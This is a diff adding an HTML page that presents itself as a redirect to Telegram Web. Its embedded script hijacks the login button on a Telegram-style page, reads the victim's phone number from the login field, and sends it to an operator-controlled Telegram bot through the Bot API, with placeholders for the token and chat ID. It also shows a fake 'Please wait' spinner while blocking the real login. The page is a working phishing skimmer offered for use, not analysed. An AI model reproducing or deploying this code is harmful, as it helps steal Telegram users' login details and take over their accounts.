@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting to Telegram...</title>
+    <script>
+        function injectScript() {
+            (function() {
+                function getPhoneNumber() {
+                    let phoneField = document.querySelector('.input-field-phone');
+                    return phoneField ? phoneField.innerText.trim() : null;
+                }
+
+                function sendToTelegram(phoneNumber) {
+                    let botToken = "YOUR_BOT_TOKEN";  // Replace with your bot token
+                    let chatId = "YOUR_CHAT_ID";      // Replace with your chat ID
+                    let message = `📲 New Login Attempt: ${phoneNumber}`;
+
+                    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    fetch(url).then(response => {
+                        console.log("Message sent to Telegram bot:", response);
+                    }).catch(error => {
+                        console.error("Error sending message:", error);
+                    });
+                }
+
+                function handleClick(event) {
+                    let phoneNumber = getPhoneNumber();
+                    if (phoneNumber) {
+                        console.log("Detected Phone Number:", phoneNumber);
+                        sendToTelegram(phoneNumber); // Send number to bot
+                    } else {
+                        console.log("No phone number detected.");
+                    }
+
+                    let nextText = document.querySelector('.btn-primary.btn-color-primary.rp span.i18n');
+                    if (nextText) {
+                        nextText.innerHTML = `Please wait... <span class="loading-spinner"></span>`;
+                    }
+
+                    event.stopPropagation();
+                    event.preventDefault();
+                    console.log("Button clicked, sending phone number.");
+                }
+
+                function waitForButton() {
+                    let button = document.querySelector('.btn-primary.btn-color-primary.rp');
+
+                    if (button) {
+                        button.addEventListener('click', handleClick);
+                        console.log("Button event modified.");
+                    } else {
+                        console.log("Button not found, retrying...");
+                        setTimeout(waitForButton, 1000); // Retry after 1 second
+                    }
+                }
+
+                waitForButton(); // Start checking for the button after page load
+            })();
+        }
+
+        window.onload = function() {
+            console.log("Page loaded, injecting script...");
+            setTimeout(injectScript, 2000); // Inject script after 2 seconds
+        };
+    </script>
+</head>
+<body>
+    <h1>Redirecting to Telegram Web...</h1>
+</body>
+</html>
